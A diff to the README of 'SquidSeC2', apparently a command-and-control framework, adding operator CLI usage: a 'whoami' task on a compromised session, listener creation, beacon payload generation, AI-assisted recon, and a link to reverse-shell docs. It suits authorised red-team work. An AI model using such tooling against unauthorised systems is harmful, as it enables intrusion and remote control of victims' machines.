@@ -35,6 +35,25 @@ uvicorn squidsec2.main:create_app --factory --host 0.0.0.0 --port 8443
 # Admin token printed path: data/admin_token.txt
 ```
 
+## Operator CLI (`ss2`)
+
+Local harness to control a remote SquidSeC2 instance:
+
+```bash
+pip install -e .
+ss2 login --url http://YOUR_HOST:8443 --token ss2_...
+ss2 health
+ss2 sessions list
+ss2 tasks create <session_id> "whoami"
+ss2 listeners create http-1 9001 --kind http
+ss2 payloads generate http_beacon_python YOUR_HOST 8443 --raw
+ss2 ai recon_assist --data "windows domain"
+ss2 repl   # interactive mode
+```
+
+Config is stored at `~/.config/squidsec2/config.json` (mode 0600).  
+Overrides: `--url` / `--token`, or env `SQUIDSEC2_URL` / `SQUIDSEC2_TOKEN`.
+
 ## API Overview
 
 | Area | Path |
@@ -108,7 +127,12 @@ Environment variables (prefix `SQUIDSEC2_`):
 3. **Policy engine** — risk scores + HITL for sensitive actions
 4. **Audit** — immutable log of all significant actions
 
-See [docs/squidsec2-vision.md](docs/squidsec2-vision.md) and [AGENTS.md](AGENTS.md).
+See:
+
+- [AGENTS.md](AGENTS.md) — agent/project memory
+- [docs/squidsec2-vision.md](docs/squidsec2-vision.md) — architecture
+- [docs/operator-runbook.md](docs/operator-runbook.md) — operator CLI & reverse shells
+- [docs/deployment.md](docs/deployment.md) — Docker / droplet deploy
 
 ## Development
 
